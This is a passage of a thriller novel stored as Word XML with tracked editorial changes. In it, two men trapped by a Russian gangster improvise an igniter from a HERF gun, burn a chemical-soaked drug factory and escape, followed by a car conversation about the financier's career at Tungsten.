electric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“Alright, then help me carry him,” </w:t>
      </w:r>
      <w:del w:id="2211" w:author="TextVet" w:date="2016-03-22T14:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="005061C4">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Sergey</w:t>
      </w:r>
      <w:ins w:id="2212" w:author="TextVet" w:date="2016-03-22T14:10:00Z">
        <w:r w:rsidR="005061C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> instructed</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And let those two guys get away?” Eugene protested. “They’re in there right now! How about just we go in, take care of them, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>then</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> we go fix Deshaun.”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“We </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> rushing in there, Zhenka!” Sergey insisted. “They could be armed, plotting ambush. Or they set up traps with bottles of chemicals. Zhenya … God forbid anything happen to you like what happen to Rex…”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two men talked briefly in Russian. The discussion ended with a few grunts as Sergey helped the injured black man balance on his remaining foot. The two of them coordinated a hurried three-legged walk down the alley. Deshaun groaned out words of gratitude through gritted teeth.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2213" w:author="TextVet" w:date="2016-03-22T14:14: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for Eugene, the silhouette of his leather-jacket-clad body, crouching with gun in hand, reappeared in the doorway downstairs. He carefully scanned the reeking slosh-covered factory room, eyeing potential hiding places amongst the packing materials and bullet-riddled equipment, and said tauntingly, “Come out, come out, wherever you are!”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01C59" w:rsidRPr="000D3488" w:rsidRDefault="00D01C59" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:commentRangeStart w:id="2214"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">There </w:t>
      </w:r>
      <w:commentRangeEnd w:id="2214"/>
      <w:r w:rsidR="0077063C">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="2214"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:smallCaps/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was barely enough room under the desk</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> for both Danny and Jason to huddle together, terrified. They could hear the Russian stalking the room below. His cautious exploration would lead him to the office in due time. If they could just buy a few seconds to make it to the car…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eyed the front door with bitter frustration. It was only a few feet away, but there was no way to open it and get down the stairs without being seen. The athletic mobster would gun them down in the alley before they could reach the SUV. Alone and in peak condition, Danny might have been able to make a dash for it, but Jason would stand no chance. And between the blood loss, the sleep deprivation, and the noxious fumes, Danny could barely blink without passing out from exertion.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Downstairs, the Russian’s footsteps squished against a sheet of cardboard soaked in the reeking slurry.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eyes went wide. He suddenly gasped.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“Are you alright?” Jason asked in hushed tones.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What are the formulas for kerosene and acetone?” Danny whispered.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blinked at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need a bond energy table…”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are you talking about?”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“I’m thinking,” Danny replied, “that the floor down there is soaked with organic chemicals. And I don’t know jack about chemistry, but I do know there’s one thing those substances have in common.”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“What’s that?”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“They’re flammable.” Danny reached over the top of the desk and groped around blindly. “See, ever since I saw those barrels get shot, I’ve been thinking… The barrels were </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>full</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, right? No oxygen to react with. Ergo, no combustion… But out </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, in the open air, with those big doors downstairs open…” He drew his hand back. “Damn it. These guys sell cocaine for a living but apparently they’re too straight-edge to smoke.”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looked at him hesitantly. “It’s okay, Danny. It was a good idea. Nobody can ever say you weren’t resourceful until the end.”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“Fuck the end,” said Danny. “I’m not done yet.”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looked around. There was nothing within reach but shards of broken glass. And his HERF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HERF gun, with its 3-megawatt S-band magnetron powered by pulsed electrical discharge from a 600-farad ultracapacitor bank.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silently unscrewed the magnetron horn. Cables protruded from the back of the megaphone-shaped component. He picked up a sharp piece of broken glass and used it to pry the epoxy insulation away. The shard sliced his palm. He found himself leaving crimson fingerprints all over the magnetron horn.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the factory below, rustling steadily drew closer.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cut one pair of cables free, and put them in his mouth one at a time to strip away the insulation with his teeth. He took each exposed, frayed metal tip between his fingers and twisted it into a fine point. When he was done, he tied the two wires to the end of the PVC pipe, leaving a quarter-inch gap between the exposed silvery ends.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frowned at the contraption. “What do you think?” he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“What’d you do?” Jason returned.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“Made the world’s most overpowered barbecue lighter,” Danny replied. “Assuming it works. We don’t have time to test it. It takes about thirty seconds to recharge. I don’t want to risk it. Now, help me find something to ignite…”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Jason found a loose sheet of paper, careful to keep it from making too much rustling noise.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shook his head. “I need something with more heat capacity. Something that will stay burning long enough to raise the temperature to its flash</w:t>
      </w:r>
      <w:del w:id="2215" w:author="TextVet" w:date="2016-03-22T14:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00137A39">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point. There’s got to be something here that will hold a decent flame…”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2216" w:author="TextVet" w:date="2016-03-22T14:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00137A39">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Jason looked at Danny and said, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“Your shirt</w:t>
      </w:r>
      <w:ins w:id="2217" w:author="TextVet" w:date="2016-03-22T14:23:00Z">
        <w:r w:rsidR="00137A39">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">,” </w:t>
        </w:r>
        <w:r w:rsidR="00137A39" w:rsidRPr="000D3488">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Jason said</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="2218" w:author="TextVet" w:date="2016-03-22T14:23:00Z">
        <w:r w:rsidR="00137A39">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It’s soaking</w:t>
      </w:r>
      <w:del w:id="2219" w:author="TextVet" w:date="2016-03-22T14:24:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C45047">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> wet</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it’s pretty uncomfortable, but that’s the least of my… Oh!”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wriggled awkwardly in the cramped space. The wrestling match with the kerosene-soaked fabric seemed interminable, but Danny ultimately prevailed. He pulled the damp floral-print away from his head, and laid it down as a wad on the linoleum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lifted the modified HERF gun and placed its tip, with the two exposed ends of wire, against the cotton heap. After giving the circuitry one last visual inspection, he pulled the trigger.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gap between the exposed wires flashed with a bright blue spark — accompanied by a cracking, zapping buzz. Danny cursed himself for forgetting one key characteristic of pulsed-current open-air spark gaps: they’re </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>loud</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responded to the noise by firing his handgun. It was much louder.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Bullets whizzed in through the shot-out windows, slamming into the opposite wall of the office. A few plinked against the exterior of the office itself, forming fresh dimples in the metal wall. Running footsteps filled the gaps between the shots.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sweatshirt ignited in a bright orange flame, burning ferociously in the fume-laden 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spun out from under the desk and, keeping his head down, extended an arm to help hoist Jason out behind him. The overweight man grunted and rose to his feet, crouching as low as his aging knees and spine would allow.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 Danny hissed, pushing him toward the front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Still crouching, Jason quickly made his way to the door and reached up to click the locks open.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Bullets zoomed through the broken windows. Jason flung the door open, sending a rush of air inward. The sweatshirt’s flames pranced with added vigor, sending specks of burning thread wafting upward. Jason’s heavy footsteps pounded down the iron stairs outside.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sprinted toward the loading doors. Equipment crashed around him as he shoved pieces aside. His feet splashed in chemical puddles.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="2220" w:author="TextVet" w:date="2016-03-22T14:28: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reached down. With one hand</w:t>
      </w:r>
      <w:ins w:id="2221" w:author="TextVet" w:date="2016-03-22T14:27:00Z">
        <w:r w:rsidR="002E3AA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he grabbed his HERF gun. With the other, heedless of the pain, he grabbed the fiery sweatshirt. He hurled the fireball through the broken window down into the factory, and dove for the door.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002E3AA8" w:rsidRPr="000D3488" w:rsidRDefault="002E3AA8" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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factory was ablaze before</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> the burning sweatshirt even touched the floor. The volatile vapors of acetone flashed first, sending an ignition wave racing out to the corners of the room. The Styrofoam and cardboard followed, lifting dirty, noxious residue into the air as they combusted. In a blink, the small factory transformed into a roaring inferno.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had just barely cleared the landing when the wave of heat blasted out behind him, carrying glowing embers and ash amidst arcs of flame.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Below, the loading doors swung open on their hinges and slammed against the side of the building, an enormous spout of fire shoving them apart in one thrust like a great demonic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within that glowing spout of red fire was the black silhouette of Eugene.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had been mere steps from the doors when the room erupted. The wave of overpressure hit him in the back like a charging bull. He fell halfway out of the doorway, landing hard against the street.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maintained enough presence of mind to keep his face down as gusts of flame billowed above. The Russian crawled toward his BMW for cover.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 alarm wailed inside the building. Water gushed from sprinklers in the factory’s high ceiling. White mist poured out into the alley alongside the red flames and black smoke. Streams trickled to the street from the factory floor, drawing streaked wet lines through the trail of blood that ran to Julie’s pale, lifeless body on the asphalt outside.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raced down the stairs with his butchered HERF gun. As soon as he</w:t>
      </w:r>
      <w:ins w:id="2222" w:author="TextVet" w:date="2016-03-22T14:34:00Z">
        <w:r w:rsidR="000D0516">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cleared the last stair and hit the pavement, he bounded toward the SUV. He hoped to see Jason in the driver’s seat, starting the engine.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Instead, Jason stood despondently next to the Navigator, looking down. All four tires had been shot out. Jason turned to Danny with an expression combining panic and nausea.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ground outside the factory, on the opposite side of the BMW, Eugene rolled frantically to extinguish himself. The Italian lambskin material of his jacket melted off in rivulets from his sides and sleeves.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scanned the alley. Here and there, amid dumpsters and discarded pallets, a handful of other cars had parked there overnight. One was a red Ford F-150. Its rear bumper and window were covered with stickers of Seattle grunge and metal bands — logos of Nirvana, Pearl Jam, Soundgarden, Queensrÿche, and Alice in Chains.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felt in his pocket, and pulled out the keychain he had lifted from Rex’s body — the one with the Ford remote and the Kurt Cobain plushie. He tried a button on the remote. The taillights of the red Ford blinked a greeting.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and Danny wasted no time getting to the late Rex’s pickup truck. The two men scrambled into the Ford. Force of habit drove Danny to the passenger’s side, and he passed the keys to Jason. The moment the key turned, the ignition was drowned out by the distorted chords of a grunge guitar riff that blasted out at jarring volumes. Danny switched off the stereo while Jason hit the gas.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climbed to his feet, covered in black soot. His jeans were charred, his hair and eyebrows were singed, and his jacket was unrecognizable. In the distance, at the end of the alley, he could see the car turning to the lanes of busy fulfillment houses, the two men inside escaping to populated safety. Eugene’s roars of anger echoed behind them.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>19</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fabric upholstery pressed against</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> Danny’s naked back, leaving a grid of tiny square crosshatches in his skin. His wounded shoulder throbbed beneath its gauze dressing, and his hand still stung from being cut and burned.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two men had not exchanged a single word. The trip was not silent, however. The middle-aged financier spent the time on his cellphone, speaking frantically into his Bluetooth headset. The conversations were brief and cheerful. They went along the lines of, “Hello, Mr. Cartwright…”</w:t>
      </w:r>
      <w:ins w:id="2223" w:author="TextVet" w:date="2016-03-22T14:37:00Z">
        <w:r w:rsidR="00FE67BA">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“Ms. Yonath…”</w:t>
      </w:r>
      <w:ins w:id="2224" w:author="TextVet" w:date="2016-03-22T14:37:00Z">
        <w:r w:rsidR="00FE67BA">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“Mr. Chew…”</w:t>
      </w:r>
      <w:ins w:id="2225" w:author="TextVet" w:date="2016-03-22T14:37:00Z">
        <w:r w:rsidR="00FE67BA">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“Yes, everything’s just fine! Listen, I’m afraid I won’t be able to provide you with a sample after all… Yes, unfortunately the prototype is inaccessible. But … Yes, we’re absolutely still on…” Those were the ones that Danny could understand. The rest were in fluent German, French, and Mandarin.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Eventually, the conversations ended. The silence was even less palatable than the chatter.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finally said something. “So, I’m dropping you off at your house, I guess?”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Danny looked at the clock above the car’s radio. “Who are you talking to, anyway?” he asked. “It’s two o’clock in the morning.”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five p.m. in Singapore.”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turned to stare out the open window. He breathed the fresh night air deeply — he couldn’t stand his own stench of chemicals, sweat, and blood.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 still don’t know who owns Tungsten,” Jason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“Excuse me?” Danny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consortium</w:t>
      </w:r>
      <w:ins w:id="2226" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidR="002B67BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2227" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002B67BD">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228" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidR="002B67BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2229" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002B67BD">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 xml:space="preserve">he ones who installed </w:t>
      </w:r>
      <w:del w:id="2230" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="002B67BD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Dr. </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Passinsky. We still </w:t>
      </w:r>
      <w:del w:id="2231" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A56F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">don’t </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">know </w:t>
      </w:r>
      <w:del w:id="2232" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A56F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>a</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:ins w:id="2233" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidR="008A56F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>o</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2234" w:author="TextVet" w:date="2016-03-29T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008A56F2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>y</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>thing about them. I’ve got some deals in the works. Some info would really help.”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shrank in his seat. “Computer hacking isn’t supposed to result in me running for my life.”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know,” said Jason. “I’m sorry. None of it was supposed to happen like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“You owe me more than an apology. </w:t>
      </w:r>
      <w:ins w:id="2235" w:author="TextVet" w:date="2016-03-29T14:42:00Z">
        <w:r w:rsidR="004D7164">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>I want</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2236" w:author="TextVet" w:date="2016-03-29T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004D7164">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>You owe me</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> an explanation.”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stared forward. “I spent twenty years as Tungsten’s COO. I was your age when I took that position. Before that, Vice President of Operations. And before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head of their Accounts Payable. I spent my whole life at that company. I took a sales position with them right out of college. They paid for my MBA. Thirty-five years, Danny. I’ve been with them for thirty-five years. You’re upset about the six years you sank into Claymore Communications, right? Well, I was with Tungsten for about as long as you’ve been alive. That company outlasted my marriage, Danny. I’ve known that company for longer than I’ve known my ex-wife.”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and now you’re bitter that they canned you,” Danny concluded. “And you just want to stick it to them by stealing their core project.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shook his head. “That’s not it at all</w:t>
      </w:r>
      <w:del w:id="2237" w:author="TextVet" w:date="2016-03-29T14:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00423FC6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, Danny</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. I hold no grudge against them. Laying me off was the right move.”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stared at him questioningly.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“Look, Tungsten was a reseller of high-end medical equipment since the seventies, right?” said Jason. “Its core business model was </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sales</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Sales in the seventies and eighties. It was a different world back then</w:t>
      </w:r>
      <w:ins w:id="2238" w:author="TextVet" w:date="2016-03-29T14:43:00Z">
        <w:r w:rsidR="0034374B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="2239" w:author="TextVet" w:date="2016-03-29T14:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0034374B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, Danny. A world of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> business cards and Rolodexes and fax machines and power ties. Tungsten’s lifeblood was mail-order catalogs, cold-calls, and conference presentations. All the stuff that used to make business, business.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then, while I was COO, the Internet came. First email, then chat rooms, then the World Wide Web, then search engines and eBay and AdSense… and then it was game over. I watched Tungsten waste away under my watch. Look, I’m all about adapting to the times and sailing with the winds of change and all that corporate boardroom jazz. And I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
